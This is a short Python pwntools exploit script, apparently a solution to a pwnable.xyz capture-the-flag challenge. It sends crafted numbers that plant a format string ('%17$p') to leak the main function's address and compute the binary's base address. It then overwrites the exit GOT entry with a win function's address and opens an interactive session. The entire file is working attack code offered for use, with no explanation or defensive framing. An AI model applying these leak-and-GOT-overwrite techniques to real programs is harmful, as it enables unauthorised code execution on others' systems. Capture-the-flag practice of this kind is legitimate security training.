#!/usr/bin/python
from pwn import *
import re

main_offset = 0xa34
result_offset = 0x202200
win_func_offset = 0xa21
exit_got_offset = 0x00201fe8

proc = process("./challenge")
# proc = remote("svc.pwnable.xyz", 30029)

context.terminal = ['tmux', 'splitw', '-v']
gdb.attach(proc)
raw_input()

# Write "%17$p" to str.Result:__%ld to leak main_func address
print proc.readuntil("  ")
proc.writeline("31565016857903205 1 -262854")

res = proc.readuntil("  ")
print res

hex_finder = re.compile("0x[0-9a-f]+")
main_addr = int(hex_finder.findall(res)[0], 16)
base_addr = main_addr - main_offset
print "base_addr is : 0x%x" % base_addr

payload = str()
payload += str((base_addr + win_func_offset) ^ 1) + " 1 "
payload += str((exit_got_offset - result_offset) / 8)
print payload

proc.writeline(payload)

proc.interactive()
